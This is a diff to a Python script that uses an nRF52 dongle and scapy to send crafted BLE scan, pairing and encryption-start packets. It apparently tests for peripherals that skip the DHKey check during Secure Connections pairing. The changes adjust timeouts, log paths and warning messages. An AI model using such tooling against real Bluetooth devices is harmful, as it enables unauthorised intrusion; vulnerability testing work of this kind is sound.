@@ -1,10 +1,10 @@
 #!/usr/bin/python
+import importlib
 import os
 import platform
 import sys
 from binascii import hexlify
 from time import sleep
-import importlib
 
 # extra libs
 sys.path.insert(0, os.getcwd() + '/')  # If the user runs this on previous path
@@ -41,7 +41,8 @@ paring_auth_request = 0x08 | + 0x01  # Le Secure Connection + bounding
 print(Fore.YELLOW + 'Using IOCap: ' + hex(pairing_iocap) + ', Auth REQ: ' + hex(paring_auth_request))
 
 # Internal vars
-SCAN_TIMEOUT = 2.2
+script_folder = os.path.dirname(os.path.realpath(__file__))
+SCAN_TIMEOUT = 3.2
 CRASH_TIMEOUT = 6.0
 none_count = 0
 end_connection = False
@@ -99,12 +100,13 @@ def scan_timeout():
     global connecting
     connecting = False
     encryption_enabled = False
+    start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)
+    start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)
+    print(Fore.YELLOW + 'Peripheral timed out (' + str(SCAN_TIMEOUT) + 's). Retrying...')
     scan_req = BTLE() / BTLE_ADV(RxAdd=slave_txaddr) / BTLE_SCAN_REQ(
         ScanA=master_address,
         AdvA=advertiser_address)
     driver.send(scan_req)
-    start_timeout('scan_timeout', SCAN_TIMEOUT, scan_timeout)
-    start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)
 
 
 def set_security_settings(pkt):
@@ -200,7 +202,7 @@ def defragment_l2cap(pkt):
 # Open serial port of NRF52 Dongle
 try:
     driver = NRF52Dongle(serial_port, '115200', logs_pcap=True,
-                         pcap_filename='logs/dhcheck_skip_capture.pcap')
+                         pcap_filename=script_folder + '/../logs/dhcheck_skip_capture.pcap')
 except Exception as e:
     print(Fore.RED + str(e))
     print(Fore.RED + 'Make sure the nRF52 dongle is properly recognized by your computer')
@@ -324,6 +326,7 @@ while True:
             version_request_number += 1
 
         elif pairing_procedure and SM_Hdr in pkt:
+            update_timeout('scan_timeout')
             # Handle pairing response and so on
             smp_answer = BLESMPServer.send_hci(raw(HCI_Hdr() / HCI_ACL_Hdr() / L2CAP_Hdr() / pkt[SM_Hdr]))
             # Start encryption setup early (before DHCheck)
@@ -359,6 +362,8 @@ while True:
 
         # Slave will send LL_ENC_RSP before the LL_START_ENC_RSP
         elif LL_START_ENC_REQ in pkt:
+            print(Fore.YELLOW + 'Received encryption request start from peripheral during the pairing procedure!!!')
+            print(Fore.YELLOW + 'This means that the peripheral is using some unknown LTK here (informed its SMP)')
             encryption_enabled = True
             pairing_procedure = False
             pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_START_ENC_RSP()
@@ -388,4 +393,4 @@ while True:
             driver.send(scan_req)
             start_timeout('crash_timeout', CRASH_TIMEOUT, crash_timeout)
 
-sleep(0.01)
+    sleep(0.01)
